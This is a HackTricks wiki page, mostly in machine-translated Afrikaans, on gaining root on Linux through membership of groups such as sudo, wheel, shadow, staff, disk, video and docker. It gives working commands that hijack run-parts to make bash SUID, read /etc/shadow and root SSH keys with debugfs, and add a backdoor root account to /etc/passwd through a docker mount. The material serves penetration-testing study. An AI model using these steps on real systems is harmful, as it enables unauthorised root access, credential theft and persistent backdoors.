# Interessante Groepe - Linux Privesc

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Sudo/Admin Groepe

### **PE - Metode 1**

**Soms**, **per standaard (of omdat sommige sagteware dit benodig)** binne die **/etc/sudoers** lêer kan jy sommige van hierdie lyne vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep sudo of admin behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net uitvoer**:
```
sudo su
```
### PE - Metode 2

Vind alle suid binêre en kyk of daar die binêre **Pkexec** is:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binêre **pkexec 'n SUID-binary** is en jy behoort tot **sudo** of **admin**, kan jy waarskynlik binêre as sudo uitvoer met `pkexec`.\
Dit is omdat dit tipies die groepe is binne die **polkit-beleid**. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat is om **pkexec** uit te voer en **per standaard** verskyn die groepe **sudo** en **admin** in sommige linux distrubus.

Om **root te word kan jy uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **error**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI gekoppel is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh-sessies** nodig:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="sessie2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wielgroep

**Soms**, **per standaard** binne die **/etc/sudoers** lêer kan jy hierdie lyn vind:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep wheel behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net uitvoer**:
```
sudo su
```
## Shadow Groep

Gebruikers van die **groep shadow** kan **lees** die **/etc/shadow** lêer:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer om **hashes te kraak**.

## Personeel Groep

**staff**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) te maak sonder om root regte te benodig (let daarop dat uitvoerbare lêers in `/usr/local/bin` in die PATH veranderlike van enige gebruiker is, en hulle kan die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[source\]](https://wiki.debian.org/SystemGroups)

In debian verspreidings, wys die `$PATH` veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, of jy 'n bevoorregte gebruiker is of nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As ons 'n paar programme in `/usr/local` kan oorneem, kan ons maklik root verkry.

Om die `run-parts` program oor te neem is 'n maklike manier om root te verkry, omdat die meeste programme 'n `run-parts` soos (crontab, wanneer ssh aanmeld) sal uitvoer.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
of Wanneer 'n nuwe ssh sessie aanmeld.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Eksploiteer**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Hierdie voorreg is byna **gelyk aan worteltoegang** aangesien jy toegang het tot al die data binne die masjien.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Toegang geweier**" error.

## Video Groep

Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies ingelog is** op 'n terminal op die masjien.

Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms observeer. Om dit te doen, moet jy die **huidige beeld op die skerm** in rou data gryp en die resolusie wat die skerm gebruik, kry. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm op `/sys/class/graphics/fb0/virtual_size` vind.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **rauwe beeld** te **open**, kan jy **GIMP** gebruik, kies die \*\*`screen.raw` \*\* lêer en kies as lêertipe **Raw image data**:

![](<../../../.gitbook/assets/image (463).png>)

Verander dan die Breedte en Hoogte na diegene wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter vertoon):

![](<../../../.gitbook/assets/image (317).png>)

## Root Groep

Dit lyk of **lede van die root groep** standaard toegang kan hê om **te wysig** sommige **diens** konfigurasielêers of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog...

**Kontroleer watter lêers root lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Groep

Jy kan **die wortel lêersisteem van die gasheer masjien aan 'n instansie se volume monteer**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief wortel op die masjien.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd Groep

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm Groep

Gewoonlik het **lede** van die groep **`adm`** toestemming om **log** lêers te **lees** wat geleë is in _/var/log/_.\
Daarom, as jy 'n gebruiker binne hierdie groep gekompromitteer het, moet jy beslis 'n **kyk na die logs** neem.

## Auth groep

Binne OpenBSD kan die **auth** groep gewoonlik in die vouers _**/etc/skey**_ en _**/var/db/yubikey**_ skryf as hulle gebruik word.\
Hierdie toestemmings kan misbruik word met die volgende eksploit om **privileges** na root te **eskaleer**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
